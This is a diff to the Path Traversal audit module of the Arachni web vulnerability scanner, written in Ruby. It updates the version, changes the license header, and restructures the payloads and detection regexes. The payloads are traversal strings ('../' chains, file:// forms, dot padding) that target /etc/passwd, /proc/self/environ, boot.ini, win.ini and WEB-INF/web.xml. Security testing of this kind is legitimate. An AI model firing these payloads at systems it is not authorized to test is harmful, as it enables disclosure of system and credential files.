@@ -1,42 +1,38 @@
 =begin
-    Copyright 2010-2013 Tasos Laskos <tasos.laskos@gmail.com>
-
-    Licensed under the Apache License, Version 2.0 (the "License");
-    you may not use this file except in compliance with the License.
-    You may obtain a copy of the License at
-
-        http://www.apache.org/licenses/LICENSE-2.0
-
-    Unless required by applicable law or agreed to in writing, software
-    distributed under the License is distributed on an "AS IS" BASIS,
-    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-    See the License for the specific language governing permissions and
-    limitations under the License.
+    Copyright 2010-2014 Tasos Laskos <tasos.laskos@gmail.com>
+    All rights reserved.
 =end
 
-#
 # Path Traversal audit module.
 #
 # @author Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
 #
-# @version 0.3.3
+# @version 0.4.1
 #
 # @see http://cwe.mitre.org/data/definitions/22.html
 # @see http://www.owasp.org/index.php/Path_Traversal
 # @see http://projects.webappsec.org/Path-Traversal
-#
 class Arachni::Modules::PathTraversal < Arachni::Module::Base
+
+    MINIMUM_TRAVERSALS = 0
+    MAXIMUM_TRAVERSALS = 6
 
     def self.options
         @options ||= {
             format: [Format::STRAIGHT],
-            regexp: [
-                /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
-                /mail:x:\d+:\d+:.+:[0-9a-zA-Z\/]+/im,
-                /\[boot loader\](.*)\[operating systems\]/im,
-                /\[fonts\](.*)\[extensions\]/im,
-                /<web\-app/im
-            ],
+            regexp: {
+                unix: [
+                    /DOCUMENT_ROOT.*HTTP_USER_AGENT/,
+                    /(root|mail):.+:\d+:\d+:.+:[0-9a-zA-Z\/]+/im
+                ],
+                windows: [
+                    /\[boot loader\](.*)\[operating systems\]/im,
+                    /\[fonts\](.*)\[extensions\]/im
+                ],
+                tomcat: [
+                    /<web\-app/im
+                ]
+            },
 
             # Add one more mutation (on the fly) which will include the extension
             # of the original value (if that value was a filename) after a null byte.
@@ -60,25 +56,28 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
         return @payloads if @payloads
 
         @payloads = {
-            unix:    [ 'etc/passwd' ],
+            unix:    [
+                '/proc/self/environ',
+                '/etc/passwd'
+            ],
             windows: [
                 'boot.ini',
                 'windows/win.ini',
                 'winnt/win.ini'
-            ]
+            ].map { |payload| [payload, "#{payload}#{'.'* 700}"] }.flatten
         }.inject({}) do |h, (platform, payloads)|
-            h[platform] = [
-                '/',
-                '/../../../../../../../../../../../../../../../../'
-            ].map do |trv|
-                payloads.map do |payload|
+            h[platform] = payloads.map do |payload|
+                trv = '/'
+                (MINIMUM_TRAVERSALS..MAXIMUM_TRAVERSALS).map do
+                    trv << '../'
                     [ "#{trv}#{payload}", "file://#{trv}#{payload}" ]
                 end
             end.flatten
+
             h
         end
 
-        @payloads[:tomcat] = [ '', '/', '/../../', '../../', ].map do |trv|
+        @payloads[:tomcat] = [ '/../../', '../../', ].map do |trv|
              [ "#{trv}WEB-INF/web.xml", "file://#{trv}WEB-INF/web.xml" ]
         end.flatten
 
@@ -97,7 +96,7 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
                 based on the presence of relevant content in the HTML responses.},
             elements:    [ Element::FORM, Element::LINK, Element::COOKIE, Element::HEADER ],
             author:      'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
-            version:     '0.3.3',
+            version:     '0.4.1',
             references:  {
                 'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                 'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
